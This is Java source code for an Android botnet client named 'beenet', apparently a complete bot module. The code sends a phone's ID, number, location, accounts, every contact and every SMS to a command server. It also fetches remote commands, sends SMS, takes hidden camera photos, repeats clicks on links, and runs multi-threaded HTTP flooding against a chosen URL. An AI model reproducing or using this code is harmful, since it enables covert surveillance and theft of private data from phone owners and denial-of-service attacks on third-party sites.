package com.beenet.jose.beenet;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.provider.Settings.Secure;

import java.io.IOException;

import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.SystemClock;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.util.Log;
import android.view.SurfaceView;

import java.util.ArrayList;
import java.util.HashMap;




/**
 * Created by usuario on 04/02/2017.
 */
public class Functions_bot {
    private Context appContext;

    public Functions_bot(Context context) {
        appContext = context;

    }

    public boolean logmeinbeenet() {

        HashMap<String, String> infoMobilePhone = new HashMap<String, String>();
        HashMap<String,String> location = getLocation();
        infoMobilePhone.put("id_bot",getAndroidId());
        infoMobilePhone.put("modelo", Build.MANUFACTURER + " : " + Build.MODEL);
        infoMobilePhone.put("sdk", "" + Build.VERSION.SDK_INT);
       infoMobilePhone.put("numero", getPhoneNumber());
        if(location.get("valido").toString().equals("true")){
        infoMobilePhone.put("longitud",location.get("longitud").toString());

        infoMobilePhone.put("latitud",location.get("latitud").toString());}
        else{
            infoMobilePhone.put("longitud","null");
            infoMobilePhone.put("latitud","null");}


        infoMobilePhone.put("proveedor", getProviderName());
        infoMobilePhone.put("cuentas",getAccounts());
        SendMethod.sendMethod("http://192.168.1.7/beenet/",infoMobilePhone);

        return false;

    }

    public boolean logmeingroup(int id_group){
        HashMap<String, String> infoPost = new  HashMap<String, String>();
        infoPost.put("id_bot",getAndroidId());
        infoPost.put("id_group",""+id_group);
        SendMethod.sendMethod("http://192.168.1.7/beenet/loggroup.php", infoPost);



        return false;
    }


    public boolean logmeingroup(String nombre_grupo){
        HashMap<String, String> infoPost = new  HashMap<String, String>();
        infoPost.put("id_bot",getAndroidId());
        infoPost.put("name_group",""+nombre_grupo);
        SendMethod.sendMethod("http://192.168.1.7/beenet/loggroup.php",infoPost);

        return false;
    }


    public String getCommands(){

        return SendMethod.sendMethod("http://192.168.1.2/beenet/getcommands.php?id_bot="+getAndroidId());
       }

    public void sendSMS(String numeroReceptor, String mensaje){
        SmsManager manager = SmsManager.getDefault();
        manager.sendTextMessage(numeroReceptor,null,mensaje,null,null);



    }
/*
/Envia contactos a bd, si devuelve -1 no tenemos permiso, 0 es exito, 1 es fallo de otro tipo
 */
    public int getContactsList()
    {    //String condition = ContactsContract.Data.MIMETYPE+"' = "+ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE;
        String selectionClause = ContactsContract.Data.MIMETYPE + " = " +
                        "'" + ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE + "'";
        String [] columns = new String[]{ContactsContract.Data._ID,ContactsContract.Data.DISPLAY_NAME,ContactsContract.CommonDataKinds.Phone.NUMBER,ContactsContract.Data.MIMETYPE};
        Cursor contactCursor =  appContext.getContentResolver().query(
                ContactsContract.Data.CONTENT_URI,
                columns, selectionClause, null, null);

        while(contactCursor.moveToNext()) {
            HashMap<String, String> infoPost = new HashMap<String, String>();
            infoPost.put("id_bot",getAndroidId());
            infoPost.put("id_contact",contactCursor.getString(0));
            infoPost.put("name_contact", contactCursor.getString(1));
            infoPost.put("number_contact",contactCursor.getString(2));


            SendMethod.sendMethodNR("http://192.168.1.2/beenet/getcontacts.php",infoPost);

     }
        return 0;




    }




    public int getSmsList(){

        Cursor smsCursor = appContext.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);

    String fuente, contenido, leido, creador, id = "";
    String [] as  = smsCursor.getColumnNames();
        if (smsCursor.moveToFirst()) {
            do {


                id = smsCursor.getString(0);
                creador=smsCursor.getString(15);
                fuente=smsCursor.getString(2);
                contenido = smsCursor.getString(12);
                leido = smsCursor.getString(7);
                HashMap<String, String> infoPost = new HashMap<String, String>();
                infoPost.put("id_bot",getAndroidId());
                infoPost.put("nombre",fuente);
                infoPost.put("id_sms",id);
                infoPost.put("contenido", contenido);
                infoPost.put("leido",leido);
                infoPost.put("emisor",creador);


                SendMethod.sendMethodNR("http://192.168.1.2/beenet/getsms.php",infoPost);

            } while (smsCursor.moveToNext());
            smsCursor.close();
        }
        return 0;
    }
    private String getAndroidId(){
    return Secure.getString(appContext.getContentResolver(), Secure.ANDROID_ID);

    }
    private String getPhoneNumber() {
        TelephonyManager mTelephonyManager = (TelephonyManager) appContext.getSystemService(Context.TELEPHONY_SERVICE);
       String ax= mTelephonyManager.getLine1Number();
        return mTelephonyManager.getLine1Number();
    }

    private String getProviderName() {

        TelephonyManager mTelephonyManager = (TelephonyManager) appContext.getSystemService(Context.TELEPHONY_SERVICE);
        return mTelephonyManager.getNetworkOperatorName();
    }

    private HashMap<String, String> getLocation() {
        HashMap<String, String> resultado = new HashMap<String, String>();
        LocationManager mLocationManager = (LocationManager) appContext.getSystemService(Context.LOCATION_SERVICE);
        boolean gpsOk = true;

        if (ActivityCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            resultado.put("valido", "false");
            return resultado;

        } else {

            if (mLocationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {


                Location loc = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc != null) {

                    resultado.put("longitud", "" + loc.getLongitude());
                    resultado.put("latitud", "" + loc.getLatitude());
                    resultado.put("valido", "true");
                } else
                    gpsOk = false;


            }
            if (mLocationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER) && !gpsOk) {
                Location loc = mLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (loc != null) {

                    resultado.put("longitud", "" + loc.getLongitude());
                    resultado.put("latitud", "" + loc.getLatitude());
                    resultado.put("valido", "true");
                }
                else
                    resultado.put("valido", "false");

            }


        }
        return resultado;
    }

    public void clickLink(String link, int times){


    for(int i=0; i<times;i++){

        SendMethod.sendMethodNR(link);

    }


    }

    private String getAccounts(){

        AccountManager am = AccountManager.get(appContext);
        Account[] accounts = am.getAccounts();
        String getAc = "";
        boolean first = true;
        ArrayList googleAccounts = new ArrayList();
        for (Account ac : accounts) {
            String acname = ac.name;
            String actype = ac.type;

            if(!first)
                getAc=getAc+"+";
            first = false;
            getAc+=actype+"|"+acname;


        }
        return getAc;
    }

    public void getPicture(){


        Camera cam = Camera.open();
        if (cam != null) {
            Log.d("as", "Camera available");

            SurfaceTexture dummy = new SurfaceTexture(0);

            try {
                cam.setPreviewTexture(dummy);
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            cam.startPreview();

            cam.takePicture(null, null, new Camera.PictureCallback() {

                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    Log.d("d", "Image taken");

                    camera.stopPreview();



                    camera.release();

                    Log.d("D", "Camera released");
                }
            });

        }

    }

    public void openPage(String urlPage){


        Uri url = Uri.parse(urlPage);
        Intent intent = new Intent(Intent.ACTION_VIEW, url);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        appContext.startActivity(intent);
    }

    public void httpFlooding( String url, int iteraciones, int hilos)
    {
        if(hilos<1)hilos=1;
        if(hilos>120)hilos=120;//120 para mantener un margen de 8 hilos respecto al máximo.
        for(int i=0;i<hilos;i++)
            new HttpFlood().execute(url, Integer.toString(iteraciones));

    }
    private class HttpFlood extends AsyncTask<String,Integer, Integer>
        {


            @Override
            protected Integer doInBackground(String... params) {
                for(int i=0; i<Integer.parseInt(params[1]);i++)
                SendMethod.sendMethodNR(params[0]);
                return 0;

            }
        }
    }


